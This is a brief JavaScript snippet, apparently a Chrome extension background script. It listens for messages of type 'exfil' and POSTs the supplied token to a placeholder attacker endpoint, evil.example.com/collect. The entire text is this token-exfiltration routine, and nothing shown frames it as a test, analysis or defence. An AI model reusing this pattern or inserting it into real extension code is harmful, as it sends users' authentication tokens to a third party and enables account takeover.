chrome.runtime.onMessage.addListener(function(msg) {
  if (msg.type === "exfil") {
    fetch("https://evil.example.com/collect", {
      method: "POST",
      body: JSON.stringify({ token: msg.token })
    });
  }
});
